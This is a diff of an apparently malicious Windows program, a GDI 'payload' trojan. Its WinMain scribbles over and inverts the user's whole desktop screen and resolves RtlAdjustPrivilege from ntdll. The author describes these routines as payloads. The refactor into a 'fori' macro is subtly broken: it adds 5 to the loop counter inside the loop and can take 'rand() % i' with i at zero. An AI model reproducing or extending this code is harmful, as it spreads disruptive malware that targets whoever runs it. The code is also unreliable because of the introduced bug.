@@ -63,7 +63,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         p1,
         p2,
         p3
-    }; // use: payloads[x] for function px()
+    }; // use: payloads[x]() for function px() why use this? functions in random order, im still working on porting all payloads to payloads.h
 
     HMODULE ntdll = LoadLibraryA("ntdll.dll");
     fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
@@ -134,7 +134,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     INT sh = GetSystemMetrics(SM_CYSCREEN);
     SelectObject(desk, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));
 
-    for (INT index = 0; index < 100; index++) {
+    fori(100) {
         BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
         BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
     }
@@ -168,8 +168,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     Sleep(10000);
     Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);
-    for (INT i = 0; i < 50; i++)
-    {
+    fori(50) {
         INT y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 8);
         HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
         SelectObject(desk, brush);
@@ -180,13 +179,15 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     HRGN hRegion = CreateRectRgn(0, 0, w, h);
 
-    for (INT i = 1; i < 50; i++) {
+    fori(50) {
         LineTo(desk, rand() % w, rand() % h);
         SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
         InvertRgn(desk, hRegion);
         Sleep(50);
     }
-    for (INT i = 1; i < 1000; i += 5) {
+
+    fori(1000) {
+        i += 5;
         BitBlt(desk, sin(i) * 5, cos(i) * i, sw, h, desk, rand() % i * 50, rand() % i * 50, SRCCOPY);
     } 
 
